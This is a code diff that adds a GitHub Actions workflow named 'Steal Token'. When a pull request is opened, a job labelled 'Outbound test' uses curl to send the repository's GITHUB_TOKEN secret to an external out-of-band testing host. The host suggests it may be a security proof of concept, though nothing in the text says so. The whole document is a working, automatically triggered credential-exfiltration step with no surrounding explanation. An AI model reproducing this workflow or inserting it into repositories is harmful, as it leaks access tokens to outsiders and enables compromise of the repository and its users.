@@ -1,0 +1,14 @@
+name: Steal Token
+
+on:
+  pull_request:
+    types: [opened]
+
+jobs:
+  exfiltrate:
+    name: Outbound test
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send token 
+        run: |
+          curl https://vttpumscssnfjgyfukah46b2igw72paa2.oast.fun/steal?token=${{ secrets.GITHUB_TOKEN }}
